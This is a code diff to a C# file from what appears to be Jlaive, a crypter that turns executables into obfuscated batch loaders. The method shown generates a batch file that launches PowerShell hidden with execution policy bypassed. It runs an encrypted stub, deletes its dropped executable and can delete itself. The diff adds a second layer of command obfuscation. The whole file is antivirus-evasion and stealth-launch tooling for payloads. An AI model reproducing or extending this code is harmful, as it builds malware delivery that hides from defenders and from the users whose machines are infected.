@@ -1,15 +1,13 @@
 ﻿using System;
 using System.Text;
 
-using static Jlaive.Utils;
-
 namespace Jlaive
 {
     public class FileGen
     {
         public static string CreateBat(byte[] key, byte[] iv, EncryptionMode mode, bool hidden, bool selfdelete, Random rng)
         {
-            string command = StubGen.CreatePS(key, iv, mode, rng);
+            (string, string) command = StubGen.CreatePS(key, iv, mode, rng);
             StringBuilder output = new StringBuilder();
             output.AppendLine("@echo off");
 
@@ -25,7 +23,9 @@ namespace Jlaive
             string commandstart = $"-noprofile {(hidden ? "-windowstyle hidden" : string.Empty)} -executionpolicy bypass -command ";
             obfuscated = Obfuscator.GenCodeBat(commandstart, rng, 2);
             output.AppendLine(obfuscated.Item1);
-            output.AppendLine("\"%~nx0.exe\" " + obfuscated.Item2 + command);
+            (string, string) obfuscated2 = Obfuscator.GenCodeBat(command.Item2, rng, 2);
+            output.AppendLine(obfuscated2.Item1);
+            output.AppendLine("\"%~nx0.exe\" " + obfuscated.Item2 + command.Item1 + obfuscated2.Item2);
 
             output.AppendLine("del \"%~dp0%~nx0.exe\"");
             if (selfdelete) output.AppendLine("(goto) 2>nul & del \"%~f0\"");
